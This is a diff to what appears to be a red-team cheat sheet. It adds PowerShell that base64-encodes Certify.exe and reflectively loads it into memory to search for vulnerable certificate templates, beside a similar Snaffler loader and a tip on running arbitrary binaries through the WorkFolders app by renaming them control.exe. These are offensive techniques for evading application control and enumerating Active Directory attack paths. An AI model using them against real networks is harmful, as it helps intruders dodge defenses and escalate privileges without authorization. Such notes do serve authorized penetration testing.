@@ -37,6 +37,13 @@ $vars.Add("c:\_data\snaffler.log")
 $passed = [string[]]$vars.ToArray()
 $asm.EntryPoint.Invoke($null, @(,$passed))
 ```
+Another example with certify.exe:   
+```powershell
+[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Temp\Certify.exe")) | Out-File -Encoding ASCII C:\Temp\Certify.txt
+$blob = Get-Content C:\Temp\Certify.txt
+$CertifyAssembly = [System.Reflection.Assembly]::Load([Convert]::FromBase64String("$blob"))
+[Certify.Program]::Main("find /vulnerable".Split())
+```
 ## Using WorkFolders
 You can use the Workfolders application in Windows to run any binary in the current directory after renaming it to "control.exe":
 ![](screenshot.png)
